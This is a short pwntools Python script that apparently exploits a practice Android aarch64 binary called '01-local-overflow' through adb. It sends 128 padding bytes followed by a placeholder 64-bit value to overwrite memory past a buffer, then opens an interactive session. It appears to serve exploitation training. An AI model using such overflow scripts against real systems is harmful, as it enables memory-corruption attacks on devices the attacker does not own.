#!/usr/bin/python

from pwn import *

context(arch='aarch64', endian='little', word_size=64, os='android')

bin_path = '/data/local/tmp/01-local-overflow'
proc = adb.process([bin_path])
proc.recvuntil('> ')

payload = 'a' * 128
payload += p64(0xdeadbabebeefc0de)
proc.send(payload)
proc.interactive()
